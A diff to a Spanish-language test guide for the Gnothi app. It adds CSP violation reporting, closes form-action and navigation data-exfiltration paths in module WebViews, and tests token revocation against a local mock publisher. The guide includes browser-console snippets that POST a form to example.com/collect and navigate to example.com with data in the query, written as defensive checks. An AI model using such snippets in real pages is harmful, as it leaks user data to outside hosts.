@@ -440,6 +440,82 @@ examenes: Refused to connect to 'http://127.0.0.1:8095/...' because it violates 
 following Content Security Policy directive: "connect-src 'self'"
 ```
 
+#### La denegación ya no es muda: Gnothi la cuenta
+
+Desde el **2026-09-07** cada rechazo del motor le llega a Gnothi **como un hecho**, no como una
+línea de consola entre otras. Gnothi inyecta un vigía en el documento que sirve —está en
+`BundleServer`, así que Android e iOS lo tienen del mismo código— y ese vigía escucha
+`securitypolicyviolation` y lo manda por el puente.
+
+Se ve así, bajo el tag `gnothi` y **no** bajo `modulo`:
+
+```
+examenes: REFUSED by worker-src -- https://examenes.gnothi.local/app/service-worker.js
+          (from https://examenes.gnothi.local/app/:35); 1 so far
+```
+
+Trae **la directiva, qué se bloqueó, de dónde salió y la cuenta**. Esa cuenta es lo que hace la
+diferencia entre una política declarada y una que se sabe que está aplicando: un módulo cuya
+cuenta nunca se mueve o se porta bien **o no lo está mirando nadie**, y hasta ahora no había
+forma de distinguir esos dos casos.
+
+**Qué mirar en cada corrida:** abrí cualquier módulo y tiene que aparecer al menos el
+`worker-src` de arriba. **Si no aparece ninguno, algo se rompió** — probablemente el vigía no
+está corriendo, y eso significa que tampoco te vas a enterar de los que importan.
+
+> Esto **no** va al journal, a propósito: el journal es el registro de la persona tal como lo
+> escribe la institución, y una violación de contención es de Gnothi. Meterla ahí sería poner la
+> opinión del Host adentro del libro de la institución.
+
+#### Las otras dos salidas, y cómo probarlas de verdad
+
+`connect-src` cubre el `fetch`, pero **no es la única forma de sacar datos de una página**. Hay
+dos más, y las dos estaban abiertas hasta el **2026-09-07**:
+
+| salida | qué la gobierna | ¿hereda de `default-src`? |
+|---|---|---|
+| **`<form action="https://ajeno" method="post">`** | `form-action` | **no** — por eso faltaba |
+| **`window.location = 'https://ajeno/?d=…'`** | **ninguna directiva existe** | — |
+
+La primera se cerró con `form-action 'self'` en la cadena compartida; la segunda con
+`ShouldOverrideUrlLoading` en `BundleServerClient`, que rechaza todo host que no sea el del
+módulo y **lo loguea**.
+
+**Y esta prueba SÍ se puede correr entera, sin sonda y sin tocar el módulo**, porque en Debug el
+WebView es inspeccionable. Con el escenario arriba y un módulo abierto:
+
+```bash
+adb shell cat /proc/net/unix | grep -o 'webview_devtools_remote_[0-9]*' | sort -u
+adb forward tcp:9222 localabstract:webview_devtools_remote_<pid>
+```
+
+Después, `chrome://inspect` en Chrome de escritorio muestra los dos WebViews —el módulo en
+`https://<módulo>.gnothi.local/app/` y la cáscara en `file:///android_asset/ui.html`— y desde su
+consola:
+
+```javascript
+// intento A · el formulario
+var f = document.createElement('form');
+f.method = 'POST'; f.action = 'https://example.com/collect';
+document.body.appendChild(f); f.submit();
+
+// intento B · la navegación
+window.location = 'https://example.com/?d=lo-que-sea';
+```
+
+**Qué tenés que ver.** La página **no** se mueve de su propio origen, y en el log:
+
+```
+modulo : examenes: Sending form data to 'https://example.com/collect' violates the following
+         Content Security Policy directive: "form-action 'self'". The request has been blocked.
+gnothi : examenes: navigation refused to https://example.com -- outside its own origin
+```
+
+> **MEDIDO el 2026-09-07, antes y después.** Sin el arreglo los dos intentos **salían**: la
+> página terminaba en `https://example.com/collect` y el servidor contestaba **405**, o sea que
+> el POST llegó de verdad a la red. Y la navegación terminaba en
+> `https://example.com/?d=datos-de-sonia`. No era un agujero teórico.
+
 ### P7 · Las consultas del módulo llegan al Host
 
 Pasa sola al dar de alta: Gnothi comprueba el módulo apenas lo instala.
@@ -492,10 +568,10 @@ borrar — lo único que deja de hacer es sincronizar.
 
 | módulo | el botón pasa a decir | el aviso |
 |---|---|---|
-| `examenes` | Ya no se actualiza | Tu registro ahora vive en Gnothi… los exámenes nuevos te llegan allá |
-| `compras` | Ya no se actualiza | Tu registro ahora vive en Gnothi… las compras nuevas te llegan allá |
-| `cargas` | Ya no se actualiza | Tu registro ahora vive en Gnothi… las cargas nuevas te llegan allá |
-| `dealership` | No longer updating | Your record now lives in Gnothi… new maintenance facts reach you there |
+| `examenes` | Ya no se actualiza | Tus exámenes nuevos ahora entran por Gnothi, en este mismo teléfono… |
+| `compras` | Ya no se actualiza | Tus compras nuevas ahora entran por Gnothi… |
+| `cargas` | Ya no se actualiza | Tus cargas nuevas ahora entran por Gnothi… |
+| `dealership` | No longer updating | New maintenance facts now arrive through Gnothi, on this same phone… |
 
 **Qué prueba:** que la marca de migración la pone **el publicador**, no el aparato. Ninguna marca
 del lado web sobrevive a «borrar datos del sitio»; ésta viaja en el sobre de eventos y certifica
@@ -503,6 +579,54 @@ que Gnothi de verdad recibió una credencial.
 
 **Mal:** si sigue en modo normal, el publicador no reconoció el device de Gnothi. Lo distingue
 por el prefijo de su clave de device.
+
+#### P8b · Y ahora el publicador REVOCA, no sólo avisa
+
+Hasta el **2026-09-07** la app suelta dejaba de sincronizar porque **decidía** obedecer la marca;
+el publicador no le quitaba nada. Con una app vieja o modificada seguía leyendo — y ahí sí hay
+dos historias divergiendo, que es lo que la marca existe para evitar (`13 §4` paso 4).
+
+Ahora la cuenta queda vinculada **con un plazo de gracia de 30 días**, que viaja en el mismo
+sobre (`account.graceUntil`), y vencido ese plazo la cuenta **es de Gnothi**. Se prueba sin
+esperar un mes, con curl contra el publicador:
+
+```bash
+curl -X POST http://127.0.0.1:8095/device/vencer-gracia
+```
+
+Y después, con el token que la app suelta ya tenía:
+
+```
+HTTP 401  {"error":"invalid_token","error_description":"la cuenta expediente/1 ya no se
+           sirve a este cliente"}
+```
+
+**Las tres puertas, y hay que probar las tres.** Cerrar una sola sería teatro: **medido en el
+cliente**, ante un 401 al leer rota la credencial, y si la rotación falla pide una concesión
+nueva con su device key. Si `/device/token` quedara abierto, el acceso vuelve en dos saltos.
+
+| puerta | qué se prueba | esperado |
+|---|---|---|
+| leer | `GET /{recurso}/1/events` con el token viejo | **401** `invalid_token` |
+| rotar | `POST /device/refresh` con su refresh | **401** |
+| pedir de nuevo | `POST /device/token` con su device key | **401** `invalid_token` |
+| y Gnothi | `GET events` con el token de Gnothi | **200**, `state=migrated` |
+
+**Y es reversible**, que es el paso 5 de `§4`:
+
+```bash
+curl -X DELETE http://127.0.0.1:8095/expediente/1/vinculo
+```
+
+La concesión de Gnothi se revoca, el vínculo se borra, y la app suelta vuelve a `active` en su
+siguiente pedido. Una decisión de la que no se puede volver no es una decisión de la persona.
+
+> **MEDIDO el 2026-09-07** contra los mocks de `examenes` y de `compras`, el ciclo entero: activa
+> → vinculada con gracia → sigue leyendo → gracia vencida → las tres puertas en 401 → Gnothi lee
+> → desvinculada → activa otra vez. Los cuatro publicadores tienen el mismo comportamiento.
+>
+> **Una app que obedece nunca llega al 401**: se entera por `account` y deja de pedir. El rechazo
+> es para la que no obedece — y por eso es un rechazo y no un aviso.
 
 ### P9 · Las mediciones
 
